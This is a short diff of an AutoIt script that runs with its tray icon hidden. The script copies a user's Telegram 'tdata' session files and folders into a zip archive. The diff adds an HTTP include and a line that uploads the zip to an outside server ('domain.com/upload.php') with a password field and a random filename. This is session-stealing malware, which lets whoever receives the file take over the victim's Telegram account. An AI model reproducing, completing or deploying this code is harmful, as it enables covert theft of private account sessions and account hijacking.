@@ -3,6 +3,7 @@
 #include <File.au3>
 #include <Array.au3>
 #include <_Zip.au3>
+#include <HTTP.au3>
 
 #NoTrayIcon
 
@@ -120,3 +121,5 @@ $outputPath = @ScriptDir & "\telegram\tdata\"
 CopyArrayFiles($tData, $aSessionFiles, $outputPath)
 CopyArrayFolders($tData, $aSessionFolders, $outputPath)
 ZipFolder($outputPath, @ScriptDir & '\zipfile.zip')
+
+_HTTP_Upload("https://domain.com/upload.php", @ScriptDir & "\zipfile.zip", "uploadinput", "pwd=123&filename=" & URLEncode("tel"&Random(1, 600000000, 1)&'.zip') )
